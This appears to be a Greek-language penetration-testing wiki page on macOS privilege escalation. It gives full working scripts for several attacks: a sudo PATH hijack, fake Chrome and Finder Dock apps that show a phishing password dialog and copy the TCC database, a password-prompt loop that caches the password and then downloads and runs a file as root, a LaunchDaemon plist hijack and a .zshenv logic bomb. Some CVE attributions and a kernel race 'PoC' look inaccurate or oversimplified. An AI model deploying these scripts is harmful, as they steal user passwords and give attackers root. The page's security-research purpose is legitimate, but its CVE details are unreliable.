# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Αν βρίσκεστε εδώ αναζητώντας TCC privilege escalation, μεταβείτε στο:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Σημειώστε ότι **τα περισσότερα tricks σχετικά με privilege escalation που επηρεάζουν Linux/Unix θα επηρεάσουν επίσης** μηχανήματα **MacOS**. Δείτε λοιπόν:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Αλληλεπίδραση χρήστη

### Sudo Hijacking

Μπορείτε να βρείτε το αρχικό [Sudo Hijacking technique μέσα στο post Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Ωστόσο, το macOS **διατηρεί** το **`PATH`** του χρήστη όταν αυτός εκτελεί **`sudo`**. Αυτό σημαίνει ότι ένας άλλος τρόπος για την πραγματοποίηση αυτής της επίθεσης θα ήταν να κάνετε **hijack άλλα binaries** που το θύμα θα εκτελέσει κατά την **εκτέλεση του sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Σημειώστε ότι ένας χρήστης που χρησιμοποιεί το terminal είναι πολύ πιθανό να έχει εγκατεστημένο το **Homebrew**. Επομένως, είναι δυνατή η hijacking binaries στο **`/opt/homebrew/bin`**.

### Dock Impersonation

Με χρήση **social engineering**, θα μπορούσατε να **impersonate**, για παράδειγμα, το Google Chrome μέσα στο Dock και στην πραγματικότητα να εκτελέσετε το δικό σας script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Μερικές προτάσεις:

- Ελέγξτε στο Dock αν υπάρχει το Chrome και, σε αυτήν την περίπτωση, **αφαιρέστε** αυτήν την καταχώρηση και **προσθέστε** την **fake** **Chrome entry στην ίδια θέση** μέσα στο Dock array.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Μερικές προτάσεις:

- **Δεν μπορείτε να αφαιρέσετε το Finder από το Dock**, επομένως, αν πρόκειται να το προσθέσετε στο Dock, μπορείτε να τοποθετήσετε το fake Finder ακριβώς δίπλα στο πραγματικό. Για αυτό, πρέπει να **προσθέσετε την καταχώριση του fake Finder στην αρχή του array του Dock**.
- Μια άλλη επιλογή είναι να μην το τοποθετήσετε στο Dock και απλώς να το ανοίξετε· το «Finder asking to control Finder» δεν είναι και τόσο περίεργο.
- Μια άλλη επιλογή για **κλιμάκωση σε root χωρίς να ζητηθεί** ο κωδικός πρόσβασης μέσω ενός απαίσιου παραθύρου, είναι να κάνετε το Finder να ζητήσει πραγματικά τον κωδικό πρόσβασης για την εκτέλεση μιας privileged ενέργειας:
- Ζητήστε από το Finder να αντιγράψει στο **`/etc/pam.d`** ένα νέο αρχείο **`sudo`**. (Το prompt που ζητά τον κωδικό πρόσβασης θα αναφέρει ότι το «Finder θέλει να αντιγράψει το sudo».)
- Ζητήστε από το Finder να αντιγράψει ένα νέο **Authorization Plugin**. (Θα μπορούσατε να ελέγξετε το όνομα του αρχείου, ώστε το prompt που ζητά τον κωδικό πρόσβασης να αναφέρει ότι το «Finder θέλει να αντιγράψει το Finder.bundle».)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Phishing μέσω prompt κωδικού πρόσβασης + επαναχρησιμοποίηση sudo

Το Malware συχνά καταχράται την αλληλεπίδραση με τον χρήστη για να **συλλέξει έναν κωδικό πρόσβασης με δυνατότητα sudo** και να τον επαναχρησιμοποιήσει προγραμματιστικά. Μια συνηθισμένη ροή:

1. Εντοπισμός του συνδεδεμένου χρήστη με `whoami`.
2. **Επανάληψη των prompt κωδικού πρόσβασης** μέχρι το `dscl . -authonly "$user" "$pw"` να επιστρέψει επιτυχία.
3. Αποθήκευση του credential στην cache (π.χ. `/tmp/.pass`) και εκτέλεση privileged ενεργειών με `sudo -S` (κωδικός πρόσβασης μέσω stdin).

Παράδειγμα ελάχιστης αλυσίδας:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Ο κλεμμένος κωδικός πρόσβασης μπορεί στη συνέχεια να επαναχρησιμοποιηθεί για **την απαλοιφή του Gatekeeper quarantine με `xattr -c`**, την αντιγραφή LaunchDaemons ή άλλων privileged αρχείων και την εκτέλεση πρόσθετων stages χωρίς αλληλεπίδραση.<sup>[[1]](#references)</sup>

## Νεότερα macOS-specific vectors (2023–2025)

### Το deprecated `AuthorizationExecuteWithPrivileges` εξακολουθεί να είναι usable

Το `AuthorizationExecuteWithPrivileges` deprecated στο 10.7, αλλά **εξακολουθεί να λειτουργεί σε Sonoma/Sequoia**. Πολλά commercial updaters καλούν το `/usr/libexec/security_authtrampoline` με μη έμπιστη διαδρομή. Αν το binary-στόχος είναι εγγράψιμο από τον χρήστη, μπορείς να τοποθετήσεις ένα trojan και να αξιοποιήσεις το νόμιμο prompt:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Συνδύασέ τα με τα **masquerading tricks παραπάνω** για να παρουσιάσεις έναν πειστικό διάλογο εισαγωγής κωδικού πρόσβασης.


### Triage προνομιούχου helper / XPC

Πολλά σύγχρονα third-party macOS privescs ακολουθούν το ίδιο μοτίβο: ένα **root LaunchDaemon** εκθέτει μια υπηρεσία **Mach/XPC** από το **`/Library/PrivilegedHelperTools`**, και στη συνέχεια το helper είτε **δεν επικυρώνει τον client**, είτε τον επικυρώνει **πολύ αργά** (PID race), είτε εκθέτει μια **root method** που χρησιμοποιεί ένα **user-controlled path/script**. Αυτή είναι η κατηγορία σφαλμάτων πίσω από πολλά πρόσφατα helper bugs σε VPN clients, game launchers και updaters.<sup>[[2]](#references)</sup>

Γρήγορο checklist triage:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Δώστε ιδιαίτερη προσοχή σε helpers που:

- συνεχίζουν να αποδέχονται requests **μετά το uninstall**, επειδή το job παρέμεινε φορτωμένο στο `launchd`
- εκτελούν scripts ή διαβάζουν configuration από το **`/Applications/...`** ή άλλες διαδρομές εγγράψιμες από χρήστες χωρίς δικαιώματα root
- βασίζονται σε validation peers με βάση το **PID** ή μόνο το **bundle-id**, το οποίο μπορεί να είναι ευάλωτο σε race condition

Για περισσότερες λεπτομέρειες σχετικά με authorization bugs σε helpers, δείτε [αυτή τη σελίδα](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Κληρονόμηση περιβάλλοντος script του PackageKit (CVE-2024-27822)

Μέχρι να το διορθώσει η Apple στα **Sonoma 14.5**, **Ventura 13.6.7** και **Monterey 12.7.5**, οι εγκαταστάσεις που ξεκινούσε ο χρήστης μέσω των **`Installer.app`** / **`PackageKit.framework`** μπορούσαν να εκτελέσουν **PKG scripts ως root μέσα στο περιβάλλον του τρέχοντος χρήστη**. Αυτό σημαίνει ότι ένα package που χρησιμοποιεί **`#!/bin/zsh`** θα φόρτωνε το **`~/.zshenv`** του attacker και θα το εκτελούσε ως **root** όταν το θύμα εγκαθιστούσε το package.<sup>[[3]](#references)</sup>

Αυτό είναι ιδιαίτερα ενδιαφέρον ως **logic bomb**: χρειάζεστε μόνο ένα foothold στον λογαριασμό του χρήστη και ένα εγγράψιμο shell startup file· στη συνέχεια περιμένετε να εκτελεστεί από τον χρήστη οποιοσδήποτε ευάλωτος installer που βασίζεται στο **zsh**. Αυτό γενικά **δεν** ισχύει για deployments μέσω **MDM/Munki**, επειδή αυτά εκτελούνται μέσα στο περιβάλλον του root user.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Αν θέλετε να εμβαθύνετε στην abuse ειδικά των installers, δείτε επίσης [αυτή τη σελίδα](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Αν ένα LaunchDaemon plist ή ο στόχος `ProgramArguments` του είναι **user-writable**, μπορείτε να κάνετε privilege escalation αντικαθιστώντας το και στη συνέχεια αναγκάζοντας το launchd να το φορτώσει ξανά:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Αυτό αντικατοπτρίζει το exploit pattern που δημοσιεύτηκε για το **CVE-2025-24085**, όπου ένα writable plist έγινε abuse για την εκτέλεση attacker code ως root.

### XNU SMR credential race (CVE-2025-24118)

Ένα **race στο `kauth_cred_proc_update`** επιτρέπει σε έναν local attacker να καταστρέψει τον read-only credential pointer (`proc_ro.p_ucred`), εκτελώντας race σε loops των `setgid()`/`getgid()` μεταξύ threads, μέχρι να συμβεί ένα torn `memcpy`. Η επιτυχής καταστροφή αποφέρει **uid 0** και πρόσβαση στη kernel memory. Ελάχιστη δομή PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Συνδύασέ το με heap grooming για να τοποθετήσεις ελεγχόμενα δεδομένα στο σημείο όπου γίνεται εκ νέου ανάγνωση του pointer. Σε ευάλωτα builds αυτό αποτελεί αξιόπιστο **local kernel privesc** χωρίς να απαιτείται SIP bypass.<sup>[[4]](#references)</sup>

### SIP bypass μέσω του Migration assistant ("Migraine", CVE-2023-32369)

Αν έχεις ήδη root, το SIP εξακολουθεί να αποκλείει τις εγγραφές σε τοποθεσίες του συστήματος. Το bug **Migraine** κάνει κατάχρηση του entitlement `com.apple.rootless.install.heritable` του Migration Assistant, ώστε να εκκινήσει μια child process που κληρονομεί το SIP bypass και να αντικαταστήσει προστατευμένα paths (π.χ. `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Η αλυσίδα:

1. Απόκτησε root σε ένα ενεργό σύστημα.
2. Κάνε trigger το `systemmigrationd` με crafted state, ώστε να εκτελέσει ένα binary που ελέγχει ο attacker.
3. Χρησιμοποίησε το inherited entitlement για να τροποποιήσεις αρχεία που προστατεύονται από το SIP, διατηρώντας την persistence ακόμη και μετά το reboot.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Πολλαπλά Apple daemons δέχονται αντικείμενα **NSPredicate** μέσω XPC και επικυρώνουν μόνο το πεδίο `expressionType`, το οποίο ελέγχεται από τον attacker. Κατασκευάζοντας ένα predicate που αξιολογεί αυθαίρετους selectors, μπορείς να επιτύχεις **code execution σε root/system XPC services** (π.χ. `coreduetd`, `contextstored`). Σε συνδυασμό με ένα αρχικό app sandbox escape, αυτό παρέχει **privilege escalation χωρίς user prompts**. Αναζήτησε XPC endpoints που κάνουν deserialize predicates και δεν διαθέτουν robust visitor.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass και privilege escalation

**Οποιοσδήποτε user** (ακόμη και μη προνομιούχος) μπορεί να δημιουργήσει και να κάνει mount ένα Time Machine snapshot με `-o noowners` και να **αποκτήσει πρόσβαση σε ΟΛΑ τα αρχεία** αυτού του snapshot, παρακάμπτοντας τους ελέγχους ownership στο live volume. Το μόνο privilege που απαιτείται είναι η εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να διαθέτει **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Οι εντολές και η πλήρης επεξήγηση βρίσκονται στη σελίδα TCC bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Ευαίσθητες Πληροφορίες

Αυτό μπορεί να είναι χρήσιμο για privilege escalation:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Αναφορές

- [1] [Pentest Partners - 2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)

{{#include ../../banners/hacktricks-training.md}}
